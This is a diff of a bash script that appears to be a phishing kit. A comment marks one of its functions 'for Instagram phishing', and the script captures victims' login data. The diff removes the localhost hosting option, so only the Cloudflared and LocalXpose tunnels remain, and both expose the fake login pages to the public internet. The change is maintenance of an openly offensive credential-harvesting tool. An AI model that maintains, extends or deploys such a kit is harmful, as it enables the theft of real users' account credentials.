@@ -272,12 +272,6 @@ about() {
 	esac
 }
 
-## Choose custom port (DISABLED - always use default)
-cusport() {
-	# Auto-use default port 8080 (skip prompt for faster setup)
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
-}
-
 ## Ask for post-login action (for Instagram phishing)
 ask_download_link() {
 	echo
@@ -488,24 +482,13 @@ start_loclx() {
 	capture_data
 }
 
-## Start localhost
-start_localhost() {
-	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	setup_site
-	{ sleep 1; clear; banner_small; }
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
-	capture_data
-}
-
 ## Tunnel selection
 tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
-		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
-		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+		${RED}[${WHITE}01${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
+		${RED}[${WHITE}02${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
 
 	EOF
 
@@ -513,10 +496,8 @@ tunnel_menu() {
 
 	case $REPLY in 
 		1 | 01)
-			start_localhost;;
-		2 | 02)
 			start_cloudflared;;
-		3 | 03)
+		2 | 02)
 			start_loclx;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
